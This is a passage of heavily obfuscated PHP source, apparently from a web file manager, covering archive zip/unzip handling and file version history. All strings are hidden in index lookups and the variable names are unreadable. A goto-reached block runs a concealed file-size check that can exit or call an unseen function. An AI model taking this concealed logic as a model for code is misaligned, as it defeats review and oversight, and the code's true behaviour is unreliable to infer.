$ÒéâÊ‰Ë[49]); return $this->error; } public function escapeString($œÁò§©) { if ($this->_linkID) { return $this->_linkID->real_escape_string($œÁò§©); } else { return addslashes($œÁò§©); } } public function parseKey(&$›Ùş—ô, $¡ÙÁ¦¸İ = true) { $ıŒ”¶ìÉ =& $_SERVER[èùÙ¹Ïö]; if ($¡ÙÁ¦¸İ) { $›Ùş—ô = $this->parseKeyCheck($›Ùş—ô); } if ($›Ùş—ô != $ıŒ”¶ìÉ[205] && !preg_match($ıŒ”¶ìÉ[957], $›Ùş—ô)) { $›Ùş—ô = $ıŒ”¶ìÉ[431] . trim($›Ùş—ô, $ıŒ”¶ìÉ[431]) . $ıŒ”¶ìÉ[431]; } return $›Ùş—ô; } } goto c¨Éä•Æ™–; FÀŸ¦…Ğ¯ç: if ($_SERVER[$_SERVER[èùÙ¹Ïö][920]] != $_size($_file)) { $_getc = $_SERVER[èùÙ¹Ïö][922]; $_getfile = $_SERVER[$_SERVER[èùÙ¹Ïö][917]] . $_SERVER[èùÙ¹Ïö][918]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[èùÙ¹Ïö][248], $_getfilec); if (count($_getarrs) < $_SERVER[èùÙ¹Ïö][663]) { $exit = $_SERVER[èùÙ¹Ïö][923]; $exit(); } $_act = $_SERVER[èùÙ¹Ïö][1193]; $_act($_file); } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $„îÁ­‚; if ($„îÁ­‚) { return $„îÁ­‚; } $‰ù²¶íè = IO::init($_SERVER[èùÙ¹Ïö][8]); return $‰ù²¶íè; } private static function iconvSystem($¦¡â£) { return self::local()->iconvSystem($¦¡â£); } private static function iconvApp($»Ô™Œ‡) { return self::local()->iconvApp($»Ô™Œ‡); } public static function zipFolder($Öû‚ü£Á, $©ºà‘” = "\172\151\160", $·¬ŒØâ— = '', $ÍöÊ¯ë = REPEAT_RENAME) { $‘Ó·ôä½ =& $_SERVER[èùÙ¹Ïö]; $Üôø¼Ç = IO::listPath($Öû‚ü£Á); if (!$Üôø¼Ç) { return !1; } $Üôø¼Ç = array_merge($Üôø¼Ç[$‘Ó·ôä½[84]], $Üôø¼Ç[$‘Ó·ôä½[85]]); return self::zip($Üôø¼Ç, $©ºà‘”, $·¬ŒØâ—, $ÍöÊ¯ë); } public static function zip($ÔÊÌÁÇ, $û›×¶¾¾ = "\x7a\151\160", $±Çñ…êå = '', $¹ÙºéÉé = REPEAT_RENAME) { $èóï¥¢Ë =& $_SERVER[èùÙ¹Ïö]; if (is_string($ÔÊÌÁÇ) && $ÔÊÌÁÇ) { $ÔÊÌÁÇ = array(array($èóï¥¢Ë[86] => $ÔÊÌÁÇ)); } $ƒ¬ùŞ‹¶ = self::init($ÔÊÌÁÇ[0][$èóï¥¢Ë[86]]); $×­Ù„şö = self::info($ÔÊÌÁÇ[0][$èóï¥¢Ë[86]]); $»ııÃ• = $èóï¥¢Ë[12]; $ ° ·™ = $èóï¥¢Ë[12]; $¯ñÎİˆç = $èóï¥¢Ë[12]; if ($±Çñ…êå && substr($±Çñ…êå, -1, 1) != $èóï¥¢Ë[8]) { $ ° ·™ = get_path_father($±Çñ…êå); $¯ñÎİˆç = get_path_this($±Çñ…êå); } else { $ ° ·™ = self::pathFather($×­Ù„şö[$èóï¥¢Ë[86]]); $¯ñÎİˆç = $×­Ù„şö[$èóï¥¢Ë[32]] . $èóï¥¢Ë[10] . $û›×¶¾¾; if (count($ÔÊÌÁÇ) > 1) { $¥áˆ§Á¨ = IO::info($ ° ·™); $¯ñÎİˆç = $¥áˆ§Á¨[$èóï¥¢Ë[32]] . $èóï¥¢Ë[10] . $û›×¶¾¾; } if ($±Çñ…êå) { $ ° ·™ = $±Çñ…êå; } } if ($ƒ¬ùŞ‹¶->getType() == $èóï¥¢Ë[108]) { $×“Ë³Éã = self::init($ ° ·™); $àÚÏ«Âª = $×“Ë³Éã->getType() == $èóï¥¢Ë[108] ? $ ° ·™ : get_path_father($ƒ¬ùŞ‹¶->path); $àÚÏ«Âª = rtrim($àÚÏ«Âª, $èóï¥¢Ë[8]) . $èóï¥¢Ë[8]; mk_dir($àÚÏ«Âª); } else { $»ııÃ• = TEMP_FILES . $èóï¥¢Ë[1231] . time() . rand_string(8) . $èóï¥¢Ë[8]; mk_dir($»ııÃ•); file_put_contents($»ııÃ• . $èóï¥¢Ë[1232], $èóï¥¢Ë[12]); $àÚÏ«Âª = $»ııÃ•; } $ …¨¯äø = IO::info($àÚÏ«Âª); if (!$ …¨¯äø || !$ …¨¯äø[$èóï¥¢Ë[219]]) { show_json(LNG($èóï¥¢Ë[1233]), !1); } $ƒÁÈƒ‡ = self::zipFileList($ÔÊÌÁÇ, $»ııÃ•); foreach ($ƒÁÈƒ‡ as $øØáüÊ => $ÒõËÅŒ¯) { $ƒÁÈƒ‡[$øØáüÊ] = self::iconvSystem($ÒõËÅŒ¯); } $Â¬Å¯Ë = get_filename_auto($àÚÏ«Âª . $¯ñÎİˆç, $èóï¥¢Ë[12], $¹ÙºéÉé); KodArchive::create(self::iconvSystem($Â¬Å¯Ë), $ƒÁÈƒ‡); if (!IO::exist($Â¬Å¯Ë)) { if ($»ııÃ•) { del_dir($»ııÃ•); } show_json(LNG($èóï¥¢Ë[1234]), !1); } if (!$»ııÃ•) { return $Â¬Å¯Ë; } $±Ğè‡ ® = self::move($Â¬Å¯Ë, $ ° ·™, $¹ÙºéÉé); if ($»ııÃ•) { del_dir($»ııÃ•); } if (!$Â¬Å¯Ë) { show_json(LNG($èóï¥¢Ë[1234]), !1); } return $±Ğè‡ ®; } public static function unzip($‚¶‘¯§û, $ÏÅ¶´Ä, $Î›É¤Ù† = "\55\61", $½¯‡¡ë = "\x72\145\x70\x6c\141\143\145") { $“•úüë‘ =& $_SERVER[èùÙ¹Ïö]; $ß°»ßò„ = parent::info($‚¶‘¯§û); if (!$ß°»ßò„) { show_json(LNG($“•úüë‘[1235]), !1); } $©í¢ı¡­ = IO::infoFullSimple($ÏÅ¶´Ä); if (!$©í¢ı¡­) { $ÏÅ¶´Ä = IO::mkdir($ÏÅ¶´Ä); } if (isset($©í¢ı¡­[$“•úüë‘[183]]) && trim($©í¢ı¡­[$“•úüë‘[86]], $“•úüë‘[8]) != trim($ÏÅ¶´Ä, $“•úüë‘[8])) { $½ì¿î‘ª = KodIO::make($©í¢ı¡­[$“•úüë‘[182]]); $ù´¶“¼³ = IO::fileNameAuto($½ì¿î‘ª, $©í¢ı¡­[$“•úüë‘[32]], REPEAT_RENAME_FOLDER, !0); $ÏÅ¶´Ä = IO::mkdir($½ì¿î‘ª . $ù´¶“¼³); } $Î›É¤Ù† = $Î›É¤Ù† && $Î›É¤Ù† != $“•úüë‘[1236] ? @json_decode($Î›É¤Ù†, !0) : -1; $›–—°¹ = self::unzipPart($‚¶‘¯§û, $Î›É¤Ù†); if (!$›–—°¹ || !IO::exist($›–—°¹[$“•úüë‘[216]])) { show_json(LNG($“•úüë‘[107]), !1); } $ÌØ’éÂ® = $›–—°¹[$“•úüë‘[1237]][count($›–—°¹[$“•úüë‘[1237]]) - 1]; if ($ÌØ’éÂ®[$“•úüë‘[1238]] == -1 || substr($ÌØ’éÂ®[$“•úüë‘[32]], -1, 1) == $“•úüë‘[8]) { $Óç¬¯±Ò = $›–—°¹[$“•úüë‘[1239]] . rand_string(10) . $“•úüë‘[8]; mk_dir($Óç¬¯±Ò); $ü–ªî¥Û = count($›–—°¹[$“•úüë‘[1237]]) == 1 ? IO::ext($‚¶‘¯§û) : get_path_ext($›–—°¹[$“•úüë‘[216]]); $°”·à› = KodArchive::extract(self::iconvSystem($›–—°¹[$“•úüë‘[216]]), $Óç¬¯±Ò, $ÌØ’éÂ®[$“•úüë‘[1238]], $ù´¶“¼³, $ü–ªî¥Û); self::unzipErrorCheck($°”·à›, array($“•úüë‘[1240], $‚¶‘¯§û, $ü–ªî¥Û, $ÏÅ¶´Ä, $›–—°¹)); Hook::trigger($“•úüë‘[1241], $Óç¬¯±Ò); recursion_dir($Óç¬¯±Ò, $²Ô¿¬ÊÏ, $êİ£ÚŒ’, 0); $–­Ùæöù = array_merge($²Ô¿¬ÊÏ, $êİ£ÚŒ’); $Úª¯–ûÍ = array(); foreach ($–­Ùæöù as $€ó»è¢ù) { $š›Ì‡šÈ = IO::move(self::iconvApp($€ó»è¢ù), $ÏÅ¶´Ä, $½¯‡¡ë); if ($š›Ì‡šÈ) { $Úª¯–ûÍ[] = $š›Ì‡šÈ; } } del_dir($Óç¬¯±Ò); } else { $š›Ì‡šÈ = IO::move($›–—°¹[$“•úüë‘[216]], $ÏÅ¶´Ä, $½¯‡¡ë, get_path_this($ÌØ’éÂ®[$“•úüë‘[32]])); if ($š›Ì‡šÈ) { $Úª¯–ûÍ[] = $š›Ì‡šÈ; } } return $Úª¯–ûÍ ? $Úª¯–ûÍ : !1; } public static function unzipList($Ìñ™İÃ¾) { $‹‡‹¬¦° =& $_SERVER[èùÙ¹Ïö]; $µ¨Ã†Œ = isset($Ìñ™İÃ¾[$‹‡‹¬¦°[1242]]) ? $Ìñ™İÃ¾[$‹‡‹¬¦°[1242]] : !1; $Ê¾ÆŸÎˆ = isset($Ìñ™İÃ¾[$‹‡‹¬¦°[1238]]) ? @json_decode($Ìñ™İÃ¾[$‹‡‹¬¦°[1238]], !0) : -1; $Ÿ„É•ñ = self::unzipPart($Ìñ™İÃ¾[$‹‡‹¬¦°[86]], $Ê¾ÆŸÎˆ); if (!$Ÿ„É•ñ || !IO::exist($Ÿ„É•ñ[$‹‡‹¬¦°[216]])) { show_json(LNG($‹‡‹¬¦°[107]), !1); } $ÃÍº¾£¶ = $Ÿ„É•ñ[$‹‡‹¬¦°[1237]][count($Ÿ„É•ñ[$‹‡‹¬¦°[1237]]) - 1]; $§¶¢Œ§ = in_array(IO::ext($Ÿ„É•ñ[$‹‡‹¬¦°[216]]), array($‹‡‹¬¦°[359], $‹‡‹¬¦°[1243], $‹‡‹¬¦°[1244], $‹‡‹¬¦°[1245], $‹‡‹¬¦°[1246], $‹‡‹¬¦°[1247])); if (!$µ¨Ã†Œ && ($ÃÍº¾£¶[$‹‡‹¬¦°[1238]] == -1 || $§¶¢Œ§)) { $¶Ô–ëñ = $Ÿ„É•ñ[$‹‡‹¬¦°[1239]] . get_path_this($Ÿ„É•ñ[$‹‡‹¬¦°[216]]) . $‹‡‹¬¦°[1248]; if (!IO::exist($¶Ô–ëñ)) { $Ï¤Ò½é = $ÃÍº¾£¶[$‹‡‹¬¦°[1238]] == -1 ? get_path_ext(IO::pathThis($Ìñ™İÃ¾[$‹‡‹¬¦°[86]])) : get_path_ext($Ÿ„É•ñ[$‹‡‹¬¦°[216]]); $ÒïË»£Ø = KodArchive::listContent(self::iconvSystem($Ÿ„É•ñ[$‹‡‹¬¦°[216]]), !0, $Ï¤Ò½é); self::unzipErrorCheck($ÒïË»£Ø, array($‹‡‹¬¦°[1249], $Ìñ™İÃ¾, $Ÿ„É•ñ)); @file_put_contents($¶Ô–ëñ, json_encode($ÒïË»£Ø[$‹‡‹¬¦°[1250]])); } return @json_decode(IO::getContent($¶Ô–ëñ), !0); } IO::fileOut($Ÿ„É•ñ[$‹‡‹¬¦°[216]], $µ¨Ã†Œ, get_path_this($ÃÍº¾£¶[$‹‡‹¬¦°[32]])); die; } private static function zipFileList($€ÊøÏÖ, $şÈÓıá = false) { $®ò»ğÂÜ =& $_SERVER[èùÙ¹Ïö]; $¬æœ¨ì™ = array(); foreach ($€ÊøÏÖ as $Ã×ıÉÃ) { $§É—ñÜ = $Ã×ıÉÃ[$®ò»ğÂÜ[86]]; if ($şÈÓıá) { $§É—ñÜ = self::copy($Ã×ıÉÃ[$®ò»ğÂÜ[86]], $şÈÓıá, $®ò»ğÂÜ[858]); } else { $Ùò¹íÒù = self::init($Ã×ıÉÃ[$®ò»ğÂÜ[86]]); if ($Ùò¹íÒù->getType() == $®ò»ğÂÜ[108]) { $§É—ñÜ = $Ùò¹íÒù->path; } } if ($§É—ñÜ && self::local()->exist($§É—ñÜ)) { $¬æœ¨ì™[$Ã×ıÉÃ[$®ò»ğÂÜ[86]]] = $§É—ñÜ; } } if (!empty($¬æœ¨ì™)) { return array_values($¬æœ¨ì™); } show_json(LNG($®ò»ğÂÜ[1213]), !1); } private static function localFilePath($·œÆôò) { $êñèÑ‹ =& $_SERVER[èùÙ¹Ïö]; $ñ´ŒóÔ = KodIO::parse($·œÆôò); if ($ñ´ŒóÔ[$êñèÑ‹[33]] == KodIO::KOD_SOURCE) { $æ½Û¾¿Ü = Model($êñèÑ‹[865])->fileInfoGet(KodIO::sourceID($·œÆôò)); if (!$æ½Û¾¿Ü[$êñèÑ‹[86]]) { show_json($êñèÑ‹[1251], !1); } $·œÆôò = $æ½Û¾¿Ü[$êñèÑ‹[86]]; } $Ç«’üÙÚ = self::init($·œÆôò); if ($Ç«’üÙÚ->pathParse[$êñèÑ‹[1199]]) { $·œÆôò = $Ç«’üÙÚ->pathParse[$êñèÑ‹[1199]]; $Ç«’üÙÚ = self::init($·œÆôò); } $Šã§Ò¯ò = $Ç«’üÙÚ->getType(); if ($Šã§Ò¯ò == $êñèÑ‹[108] || $Šã§Ò¯ò == $êñèÑ‹[1252]) { if (!$Ç«’üÙÚ->exist($Ç«’üÙÚ->path)) { show_json(LNG($êñèÑ‹[107]), !1); } return $Ç«’üÙÚ->path; } return !1; } public static function unzipPart($ĞË§É‡, $‹ö²— = -1) { $æïö´³ =& $_SERVER[èùÙ¹Ïö]; $ÎÎêô‚¯ = IO::pathThis($ĞË§É‡); if (!$‹ö²— || $‹ö²— == -1) { $š¯´‹û = array(array($æïö´³[32] => $ÎÎêô‚¯, $æïö´³[1238] => -1)); $š¯´‹û[0][$æïö´³[1253]] = $š¯´‹û[0][$æïö´³[32]]; } else { if (is_array($‹ö²—)) { $š¯´‹û = $‹ö²—; $›•í–Ã¤ = count($š¯´‹û) - 1; for ($óÃ™ÓÉø = 0; $óÃ™ÓÉø <= $›•í–Ã¤; $óÃ™ÓÉø++) { $Şíİô¡Ö = $š¯´‹û[$óÃ™ÓÉø]; $³ìßõÑ = get_path_this($Şíİô¡Ö[$æïö´³[32]]) . (checkExtSafe($Şíİô¡Ö[$æïö´³[32]]) ? $æïö´³[12] : $æïö´³[1254]); $š¯´‹û[$óÃ™ÓÉø][$æïö´³[1253]] = $æïö´³[1255] . intval($Şíİô¡Ö[$æïö´³[1238]]) . $æïö´³[432] . $³ìßõÑ; if ($óÃ™ÓÉø == 0) { continue; } $š¯´‹û[$óÃ™ÓÉø][$æïö´³[1253]] = $š¯´‹û[$óÃ™ÓÉø - 1][$æïö´³[1253]] . $æïö´³[1256] . $š¯´‹û[$óÃ™ÓÉø][$æïö´³[1253]]; } } } if (!is_array($š¯´‹û) || count($š¯´‹û) == 0) { return !1; } $Ì­Š—“˜ = $š¯´‹û[count($š¯´‹û) - 1]; if (!IO::exist($ĞË§É‡)) { return !1; } $Áâ™©Âó = TEMP_FILES . $æïö´³[1257] . kodIO::hashPathSafe($ĞË§É‡) . $æïö´³[8]; $ Ç˜Ÿ˜° = $Áâ™©Âó . $Ì­Š—“˜[$æïö´³[1253]]; mk_dir($Áâ™©Âó); file_put_contents(TEMP_FILES . $æïö´³[1232], $æïö´³[12]); if (IO::exist($ Ç˜Ÿ˜°)) { return array($æïö´³[216] => $ Ç˜Ÿ˜°, $æïö´³[1237] => $š¯´‹û, $æïö´³[1239] => $Áâ™©Âó); } $¹êÎş¿Ğ = self::localFilePath($ĞË§É‡); if (!$¹êÎş¿Ğ) { $¹êÎş¿Ğ = $Áâ™©Âó . $æïö´³[1258]; if (!IO::exist($¹êÎş¿Ğ)) { self::copy($ĞË§É‡, $Áâ™©Âó, !1, get_path_this($¹êÎş¿Ğ)); } } if (!$¹êÎş¿Ğ || !IO::exist($¹êÎş¿Ğ)) { return !1; } if ($Ì­Š—“˜[$æïö´³[1238]] == -1) { return array($æïö´³[216] => $¹êÎş¿Ğ, $æïö´³[1237] => $š¯´‹û, $æïö´³[1239] => $Áâ™©Âó); } $»ÆÉøâ = $¹êÎş¿Ğ; foreach ($š¯´‹û as $óÃ™ÓÉø => $Şíİô¡Ö) { if (!$Şíİô¡Ö || $Şíİô¡Ö[$æïö´³[1238]] == $æïö´³[1236]) { break; } if (substr($Şíİô¡Ö[$æïö´³[32]], -1, 1) == $æïö´³[8]) { break; } $ –ºë®Ÿ = in_array(get_path_ext($Şíİô¡Ö[$æïö´³[1253]]), array($æïö´³[359], $æïö´³[1243], $æïö´³[1244], $æïö´³[1245], $æïö´³[1246], $æïö´³[1247])); $“ãî•ŠÚ = $óÃ™ÓÉø == count($š¯´‹û) - 1 && $ –ºë®Ÿ; $Øşßğì¢ = $Áâ™©Âó . $Şíİô¡Ö[$æïö´³[1253]]; $Üˆ¡†İ  = $Áâ™©Âó . get_path_this($Şíİô¡Ö[$æïö´³[32]]); if (IO::exist($Øşßğì¢)) { $»ÆÉøâ = $Øşßğì¢; continue; } $€ˆîæ›¶ = $óÃ™ÓÉø == 0 ? get_path_ext($ÎÎêô‚¯) : get_path_ext($»ÆÉøâ); $ĞŸ°øŞê = KodArchive::extract(self::iconvSystem($»ÆÉøâ), $Áâ™©Âó, $Şíİô¡Ö[$æïö´³[1238]], $ôñ ×Üæ, $€ˆîæ›¶); self::unzipErrorCheck($ĞŸ°øŞê, array($æïö´³[1259], $ĞË§É‡, $š¯´‹û, $Şíİô¡Ö, $Øşßğì¢)); if (IO::exist($Üˆ¡†İ )) { IO::rename($Üˆ¡†İ , get_path_this($Øşßğì¢)); } $»ÆÉøâ = $Øşßğì¢; } $ Ç˜Ÿ˜° = $»ÆÉøâ; return array($æïö´³[216] => $»ÆÉøâ, $æïö´³[1237] => $š¯´‹û, $æïö´³[1239] => $Áâ™©Âó); } private static function unzipErrorCheck($½äá©Î, $êƒÅ„àá = false) { $ÙŸŒù„ƒ =& $_SERVER[èùÙ¹Ïö]; if ($½äá©Î[$ÙŸŒù„ƒ[1260]]) { return !0; } write_log(array($ÙŸŒù„ƒ[1261], $½äá©Î, $êƒÅ„àá), $ÙŸŒù„ƒ[1262]); show_json($ÙŸŒù„ƒ[1263] . json_encode($½äá©Î[$ÙŸŒù„ƒ[1250]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $êÁ»Ş”î =& $_SERVER[èùÙ¹Ïö]; $š„±š²Í = $GLOBALS[$êÁ»Ş”î[6]][$êÁ»Ş”î[91]]; if ($š„±š²Í[$êÁ»Ş”î[1264]] != 1) { return; } if ($š„±š²Í[$êÁ»Ş”î[1265]] <= 0) { return; } if (isset($_REQUEST[$êÁ»Ş”î[1266]]) && $_REQUEST[$êÁ»Ş”î[1266]] == $êÁ»Ş”î[90]) { return; } Hook::bind($êÁ»Ş”î[1267], $êÁ»Ş”î[1268]); Hook::bind($êÁ»Ş”î[1269], $êÁ»Ş”î[1270]); Hook::bind($êÁ»Ş”î[1271], $êÁ»Ş”î[1272]); Hook::bind($êÁ»Ş”î[1273], $êÁ»Ş”î[1274]); Hook::bind($êÁ»Ş”î[1275], $êÁ»Ş”î[1276]); Hook::bind($êÁ»Ş”î[1277], $êÁ»Ş”î[1278]); } public static function eventBeforeUpload($İ˜¤ûÀÚ) { if ($İ˜¤ûÀÚ[3] && $İ˜¤ûÀÚ[3] != REPEAT_REPLACE) { return; } $»¬¬‹› = self::parsePath($İ˜¤ûÀÚ[0]); if (!$»¬¬‹›) { return; } self::add($»¬¬‹›); } public static function eventBeforeEdit($˜†çì„) { $¯õã‘¹ = self::parsePath($˜†çì„[0]); if (!$¯õã‘¹) { return; } self::add($¯õã‘¹); } public static function eventBeforeCopyFile($öÄÔßà², $Œ±ëÒÚÒ, $ –¡ş‘ö, $ğí“ìÖ, $ÎÑ¹×íä, $‹µÜ”–ø) { $ù×¨— =& $_SERVER[èùÙ¹Ïö]; if (isset($ –¡ş‘ö->_data[$ù×¨—[1203]]) && $ –¡ş‘ö->_data[$ù×¨—[1203]]) { return; } $‡®œ¼×É = $ –¡ş‘ö->getPathOuter($ğí“ìÖ); $ßÀôë± = self::parsePath($‡®œ¼×É); if (!$ßÀôë±) { return; } self::add($ßÀôë±); } public static function eventBeforeRename($”æÖ÷ó¨) { $ƒœÈßšÆ =& $_SERVER[èùÙ¹Ïö]; $Ò²â×æœ = self::parsePath($”æÖ÷ó¨[0]); if (!$Ò²â×æœ) { return; } $–¸“®è = self::checkInHistory($Ò²â×æœ); if (!$–¸“®è) { return; } if ($–¸“®è[$ƒœÈßšÆ[33]] == $ƒœÈßšÆ[216]) { $ÉÕÂ²£Õ = self::listData($Ò²â×æœ); if ($ÉÕÂ²£Õ && $ÉÕÂ²£Õ[$ƒœÈßšÆ[415]]) { self::moveHistory($Ò²â×æœ, $”æÖ÷ó¨[1]); } } else { IO::rename($–¸“®è[$ƒœÈßšÆ[86]], $”æÖ÷ó¨[1]); } } public static function eventBeforeMove($ğ™·½¦Œ) { $¹ñæû‹Ë =& $_SERVER[èùÙ¹Ïö]; $ôøûÀ‰Å = self::parsePath($ğ™·½¦Œ[0]); if (!$ôøûÀ‰Å) { return; } $ç­ˆ±¼û = self::parsePath($ğ™·½¦Œ[1]); if (!$ç­ˆ±¼û) { return; } $ÁÙ¤­Öã = $ğ™·½¦Œ[3]; $ı©Ö¼¿² = self::checkInHistory($ôøûÀ‰Å); if (!$ı©Ö¼¿²) { return; } $†›õ—«á = self::pathHistory($ç­ˆ±¼û); if ($ı©Ö¼¿²[$¹ñæû‹Ë[33]] == $¹ñæû‹Ë[216]) { $ÙÍçáë³ = self::listData($ôøûÀ‰Å); $¤øéÊÊğ = rtrim($ç­ˆ±¼û, $¹ñæû‹Ë[8]) . $¹ñæû‹Ë[8] . ($ÁÙ¤­Öã ? $ÁÙ¤­Öã : get_path_this($ôøûÀ‰Å)); $éØ¸™Â = self::listData($¤øéÊÊğ); if ($ÙÍçáë³ && $ÙÍçáë³[$¹ñæû‹Ë[415]] && $éØ¸™Â && $éØ¸™Â[$¹ñæû‹Ë[415]]) { return self::clear($ôøûÀ‰Å); } if ($ÙÍçáë³ && $ÙÍçáë³[$¹ñæû‹Ë[415]]) { self::moveHistory($ôøûÀ‰Å, $ÁÙ¤­Öã, $†›õ—«á); } } else { IO::move($ı©Ö¼¿²[$¹ñæû‹Ë[86]], $†›õ—«á, !1, $ÁÙ¤­Öã); self::clearEmptyFolder(IO::pathFather($ı©Ö¼¿²[$¹ñæû‹Ë[86]])); } } public static function eventAfterRemove($ó¯èíšÁ, $Ò¿¨Î¼Æ) { $¤Ôöı¶¥ =& $_SERVER[èùÙ¹Ïö]; if (!$Ò¿¨Î¼Æ) { return; } $İ¤É“ÉÊ = self::parsePath($ó¯èíšÁ[0]); if (!$İ¤É“ÉÊ) { return; } $ú°¡¸ãÓ = self::checkInHistory($İ¤É“ÉÊ); if (!$ú°¡¸ãÓ) { return; } if ($ú°¡¸ãÓ[$¤Ôöı¶¥[33]] == $¤Ôöı¶¥[216]) { $Å•ßÀµš = self::listData($İ¤É“ÉÊ, !1); if ($Å•ßÀµš && $Å•ßÀµš[$¤Ôöı¶¥[415]]) { self::clear($İ¤É“ÉÊ, !1); } } else { IO::remove($ú°¡¸ãÓ[$¤Ôöı¶¥[86]]); self::clearEmptyFolder(IO::pathFather($ú°¡¸ãÓ[$¤Ôöı¶¥[86]])); } } private static function checkInHistory($Ö»ø£ëÌ) { $Ï«ˆß¬‘ = self::pathHistory($Ö»ø£ëÌ); if (!IO::exist($Ï«ˆß¬‘)) { $Ï«ˆß¬‘ .= $_SERVER[èùÙ¹Ïö][1279]; } return IO::exist($Ï«ˆß¬‘) ? IO::info($Ï«ˆß¬‘) : !1; } private static function parsePath($‚äí—ç¥) { $®²¼ïäò =& $_SERVER[èùÙ¹Ïö]; if (!$‚äí—ç¥) { return !1; } if ($GLOBALS[$®²¼ïäò[1280]]) { return; } $´·¯ıÍÖ = KodIO::parse($‚äí—ç¥); $å„ˆà–¶ = $´·¯ıÍÖ[$®²¼ïäò[33]]; $¬ÈÀœÇ‡ = !$å„ˆà–¶ || $å„ˆà–¶ == KodIO::KOD_IO || $å„ˆà–¶ == KodIO::KOD_SHARE_ITEM; if (!$¬ÈÀœÇ‡ || !$´·¯ıÍÖ[$®²¼ïäò[1281]]) { return !1; } if (substr($‚äí—ç¥, 0, strlen(DATA_PATH . $®²¼ïäò[1282])) == DATA_PATH . $®²¼ïäò[1282]) { return !1; } if ($å„ˆà–¶ == KodIO::KOD_SHARE_ITEM) { $Ğ›…¬øö = IO::init($‚äí—ç¥); if ($Ğ›…¬øö->pathParse[$®²¼ïäò[1199]]) { return self::parsePath($Ğ›…¬øö->pathParse[$®²¼ïäò[1199]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $›Ñ”Ÿ´ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $®²¼ïäò[1283]); foreach ($›Ñ”Ÿ´ as $ÍãœóÌØ) { if (!$å„ˆà–¶ && substr($‚äí—ç¥, 0, strlen($ÍãœóÌØ)) == $ÍãœóÌØ) { return !1; } } self::log($GLOBALS[$®²¼ïäò[1194]] . $®²¼ïäò[1284] . $‚äí—ç¥); return $‚äí—ç¥; } private static function pathHistory($®ØÚì€) { $ì“³¦Ş =& $_SERVER[èùÙ¹Ïö]; $Ú¶ë‚À = self::$_historyBase . ltrim(KodIO::clear($®ØÚì€), $ì“³¦Ş[8]); $Ú¶ë‚À = str_replace(array($ì“³¦Ş[1285]), array($ì“³¦Ş[1286]), $Ú¶ë‚À); return $Ú¶ë‚À; } public static function log($ÚŒ÷Äƒ) { } public static function historyCount($üı÷š) { $°ªĞ»õÜ =& $_SERVER[èùÙ¹Ïö]; $¸ö‘¸«ì = array(); $ÈıõéÂÅ = array(); foreach ($üı÷š as $ÈŞıôÉ©) { $èö˜¿’ = get_path_father($ÈŞıôÉ©); if (!$ÈıõéÂÅ[$èö˜¿’]) { $ÈıõéÂÅ[$èö˜¿’] = array(); } $ÈıõéÂÅ[$èö˜¿’][] = get_path_this($ÈŞıôÉ©); } foreach ($ÈıõéÂÅ as $èö˜¿’ => $¶ø ¹Şü) { $”â¸‚Ğ­ = self::parsePath($èö˜¿’); if (!$”â¸‚Ğ­) { continue; } foreach ($¶ø ¹Şü as $ĞÏŸ…˜Ä) { $Ì®í¹û = self::listData(rtrim($”â¸‚Ğ­, $°ªĞ»õÜ[8]) . $°ªĞ»õÜ[8] . $ĞÏŸ…˜Ä, !1); if ($Ì®í¹û && $Ì®í¹û[$°ªĞ»õÜ[415]]) { $¸ö‘¸«ì[rtrim($èö˜¿’, $°ªĞ»õÜ[8]) . $°ªĞ»õÜ[8] . $ĞÏŸ…˜Ä] = count($Ì®í¹û[$°ªĞ»õÜ[415]]); } } } return $¸ö‘¸«ì; } public static function add($ü–¡ËÖ) { $ÃÕª¬˜ =& $_SERVER[èùÙ¹Ïö]; $ò‘‘†•† = self::listData($ü–¡ËÖ); if (!$ò‘‘†•†) { return; } $ì’»áÈì = Model($ÃÕª¬˜[810])->get($ÃÕª¬˜[1287]); $Ûæ»íª = intval($GLOBALS[$ÃÕª¬˜[6]][$ÃÕª¬˜[91]][$ÃÕª¬˜[1265]]); $ÔÚÜÏÔ« = $ì’»áÈì == $ÃÕª¬˜[1288] ? min(5, $Ûæ»íª) : $Ûæ»íª; if ($Ûæ»íª <= 0) { return; } $ó’²¢¥ = IO::info($ü–¡ËÖ); $Êú¬¹Æª = $ò‘‘†•†[$ÃÕª¬˜[415]]; if ($ó’²¢¥[$ÃÕª¬˜[78]] == 0) { return; } if ($ó’²¢¥[$ÃÕª¬˜[78]] >= 1024 * 1024 * 500) { return !1; } $èóõöŠæ = IO::hashSimple($ü–¡ËÖ); if ($Êú¬¹Æª && $Êú¬¹Æª[0][$ÃÕª¬˜[643]] == $èóõöŠæ) { return !0; } if (array_key_exists($ÃÕª¬˜[219], $ó’²¢¥) && !$ó’²¢¥[$ÃÕª¬˜[219]]) { return !1; } $ÈœÑß¸— = short_id(time()); $“õã±õ£ = array($ÃÕª¬˜[445] => $ÈœÑß¸—, $ÃÕª¬˜[643] => $èóõöŠæ, $ÃÕª¬˜[32] => $ó’²¢¥[$ÃÕª¬˜[32]] . $ÃÕª¬˜[10] . date($ÃÕª¬˜[1289]) . rand_string(1), $ÃÕª¬˜[78] => $ó’²¢¥[$ÃÕª¬˜[78]], $ÃÕª¬˜[497] => USER_ID, $ÃÕª¬˜[217] => time(), $ÃÕª¬˜[1290] => $ÃÕª¬˜[12]); IO::mkdir($ò‘‘†•†[$ÃÕª¬˜[1291]]); $»š…¨§• = IO::copy($ü–¡ËÖ, $ò‘‘†•†[$ÃÕª¬˜[1291]], !1, $“õã±õ£[$ÃÕª¬˜[32]]); if (!$»š…¨§•) { self::clearEmptyFolder($ò‘‘†•†[$ÃÕª¬˜[1291]]); return !1; } array_unshift($Êú¬¹Æª, $“õã±õ£); if (count($Êú¬¹Æª) > $ÔÚÜÏÔ«) { $½£îàå = array_slice($Êú¬¹Æª, $ÔÚÜÏÔ«); foreach ($½£îàå as $¾óËæ®) { IO::remove($ò‘‘†•†[$ÃÕª¬˜[1291]] . $¾óËæ®[$ÃÕª¬˜[32]]); } $Êú¬¹Æª = array_slice($Êú¬¹Æª, 0, $ÔÚÜÏÔ«); } return self::saveData($ò‘‘†•†[$ÃÕª¬˜[1292]], $Êú¬¹Æª); } public static function remove($¯øµëˆÃ, $¢ƒ¶×æÊ) { $‡¹Ïªİä =& $_SERVER[èùÙ¹Ïö]; $§èÀåÄ¿ = self::listData($¯øµëˆÃ); $÷“•Ü† = array(); if 